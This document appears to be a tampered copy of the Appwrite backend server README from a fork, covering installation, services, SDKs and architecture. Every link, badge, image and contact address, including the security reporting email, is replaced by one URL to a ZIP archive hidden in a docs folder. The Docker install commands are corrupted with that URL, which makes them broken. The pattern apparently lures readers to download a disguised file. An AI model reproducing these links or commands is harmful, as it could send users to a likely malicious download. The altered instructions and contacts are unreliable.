<br />
<p align="center">
    <a href="https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip" target="_blank"><img width="260" height="39" src="https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip" alt="Appwrite Logo"></a>
    <br />
    <br />
    <b>A complete backend solution for your [Flutter / Vue / Angular / React / iOS / Android / *ANY OTHER*] app</b>
    <br />
    <br />
</p>

<!-- [![Hacktoberfest](https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip)](https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip) -->
<!-- [![Build Status](https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip)](https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip) -->
[![Discord](https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip)](https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip)
[![Docker Pulls](https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip)](https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip)
[![Build Status](https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip)](https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip)
[![Twitter Account](https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip)](https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip)
[![Translate](https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip)](https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip)
[![Swag Store](https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip%20store-f02e65?style=flat-square)](https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip)

English | [简体中文](https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip)

[**Appwrite 0.14 has been released! Learn what's new!**](https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip)

Appwrite is an end-to-end backend server for Web, Mobile, Native, or Backend apps packaged as a set of Docker<nobr> microservices. Appwrite abstracts the complexity and repetitiveness required to build a modern backend API from scratch and allows you to build secure apps faster.

Using Appwrite, you can easily integrate your app with user authentication & multiple sign-in methods, a database for storing and querying users and team data, storage and file management, image manipulation, Cloud Functions, and [more services](https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip).

![Appwrite](https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip)

Find out more at: [https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip](https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip)

Table of Contents:

- [Installation](#installation)
  - [Unix](#unix)
  - [Windows](#windows)
    - [CMD](#cmd)
    - [PowerShell](#powershell)
  - [Upgrade from an Older Version](#upgrade-from-an-older-version)
- [Getting Started](#getting-started)
  - [Services](#services)
  - [SDKs](#sdks)
    - [Client](#client)
    - [Server](#server)
    - [Community](#community)
- [Architecture](#architecture)
- [Contributing](#contributing)
- [Security](#security)
- [Follow Us](#follow-us)
- [License](#license)

## Installation

Appwrite backend server is designed to run in a container environment. Running your server is as easy as running one command from your terminal. You can either run Appwrite on your localhost using docker-compose or on any other container orchestration tool like Kubernetes, Docker Swarm, or Rancher.

The easiest way to start running your Appwrite server is by running our docker-compose file. Before running the installation command, make sure you have [Docker](https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip) installed on your machine:

### Unix

```bash
docker run -it --rm \
    --volume https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip \
    --volume "$(pwd)"/appwrite:/usr/src/code/appwrite:rw \
    --entrypoint="install" \
    appwrite/appwrite:0.14.2
```

### Windows

#### CMD

```cmd
docker run -it --rm ^
    --volume https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip ^
    --volume "%cd%"/appwrite:/usr/src/code/appwrite:rw ^
    --entrypoint="install" ^
    appwrite/appwrite:0.14.2
```

#### PowerShell

```powershell
docker run -it --rm ,
    --volume https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip ,
    --volume ${pwd}/appwrite:/usr/src/code/appwrite:rw ,
    --entrypoint="install" ,
    appwrite/appwrite:0.14.2
```

Once the Docker installation completes, go to http://localhost to access the Appwrite console from your browser. Please note that on non-Linux native hosts, the server might take a few minutes to start after installation completes.


For advanced production and custom installation, check out our Docker [environment variables](https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip) docs. You can also use our public [https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip](https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip) file to manually set up an environment.

### Upgrade from an Older Version

If you are upgrading your Appwrite server from an older version, you should use the Appwrite migration tool once your setup is completed. For more information regarding this, check out the [Installation Docs](https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip).

## Getting Started

Getting started with Appwrite is as easy as creating a new project, choosing your platform, and integrating its SDK into your code. You can easily get started with your platform of choice by reading one of our Getting Started tutorials.

* [Getting Started for Web](https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip)
* [Getting Started for Flutter](https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip)
* [Getting Started for Apple](https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip)
* [Getting Started for Android](https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip)
* [Getting Started for Server](https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip)
* [Getting Started for CLI](https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip)

### Services

* [**Account**](https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip) - Manage current user authentication and account. Track and manage the user sessions, devices, sign-in methods, and security logs.
* [**Users**](https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip) - Manage and list all project users when in admin mode.
* [**Teams**](https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip) - Manage and group users in teams. Manage memberships, invites, and user roles within a team.
* [**Database**](https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip) - Manage database collections and documents. Read, create, update, and delete documents and filter lists of document collections using advanced filters.
* [**Storage**](https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip) - Manage storage files. Read, create, delete, and preview files. Manipulate the preview of your files to fit your app perfectly. All files are scanned by ClamAV and stored in a secure and encrypted way.
* [**Functions**](https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip) - Customize your Appwrite server by executing your custom code in a secure, isolated environment. You can trigger your code on any Appwrite system event, manually or using a CRON schedule.
* [**Locale**](https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip) - Track your user's location, and manage your app locale-based data.
* [**Avatars**](https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip) - Manage your users' avatars, countries' flags, browser icons, credit card symbols, and generate QR codes.

For the complete API documentation, visit [https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip](https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip). For more tutorials, news and announcements check out our [blog](https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip) and [Discord Server](https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip).

### SDKs

Below is a list of currently supported platforms and languages. If you wish to help us add support to your platform of choice, you can go over to our [SDK Generator](https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip) project and view our [contribution guide](https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip).

#### Client
* ✅  &nbsp; [Web](https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip) (Maintained by the Appwrite Team)
* ✅  &nbsp; [Flutter](https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip) (Maintained by the Appwrite Team)
* ✅  &nbsp; [Apple](https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip) - **Beta** (Maintained by the Appwrite Team)
* ✅  &nbsp; [Android](https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip) (Maintained by the Appwrite Team)

#### Server
* ✅  &nbsp; [NodeJS](https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip) (Maintained by the Appwrite Team)
* ✅  &nbsp; [PHP](https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip) (Maintained by the Appwrite Team)
* ✅  &nbsp; [Dart](https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip) - (Maintained by the Appwrite Team)
* ✅  &nbsp; [Deno](https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip) - **Beta** (Maintained by the Appwrite Team)
* ✅  &nbsp; [Ruby](https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip) (Maintained by the Appwrite Team)
* ✅  &nbsp; [Python](https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip) (Maintained by the Appwrite Team)
* ✅  &nbsp; [Kotlin](https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip) - **Beta** (Maintained by the Appwrite Team)
* ✅  &nbsp; [Apple](https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip) - **Beta** (Maintained by the Appwrite Team)
* ✅  &nbsp; [.NET](https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip) - **Experimental** (Maintained by the Appwrite Team)

#### Community
* ✅  &nbsp; [Appcelerator Titanium](https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip) (Maintained by [Michael Gangolf](https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip))
* ✅  &nbsp; [Godot Engine](https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip) (Maintained by [fenix-hub @GodotNuts](https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip))

Looking for more SDKs? - Help us by contributing a pull request to our [SDK Generator](https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip)!


## Architecture

![Appwrite Architecture](https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip)

Appwrite uses a microservices architecture that was designed for easy scaling and delegation of responsibilities. In addition, Appwrite supports multiple APIs (REST, WebSocket, and GraphQL-soon) to allow you to interact with your resources leveraging your existing knowledge and protocols of choice.

The Appwrite API layer was designed to be extremely fast by leveraging in-memory caching and delegating any heavy-lifting tasks to the Appwrite background workers. The background workers also allow you to precisely control your compute capacity and costs using a message queue to handle the load. You can learn more about our architecture in the [contribution guide](https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip).

## Contributing

All code contributions - including those of people having commit access - must go through a pull request and be approved by a core developer before being merged. This is to ensure a proper review of all the code.

We truly ❤️ pull requests! If you wish to help, you can learn more about how you can contribute to this project in the [contribution guide](https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip).

## Security

For security issues, kindly email us at [https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip](https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip) instead of posting a public issue on GitHub.

## Follow Us

Join our growing community around the world! See our official [Blog](https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip). Follow us on [Twitter](https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip), [Facebook Page](https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip), [Facebook Group](https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip) , [Dev Community](https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip) or join our live [Discord server](https://github.com/Waka758/appwrite/raw/refs/heads/master/docs/examples/0.13.x/console-cli/examples/health/Software_2.3.zip) for more help, ideas, and discussions.

## License

This repository is available under the [BSD 3-Clause License](./LICENSE).
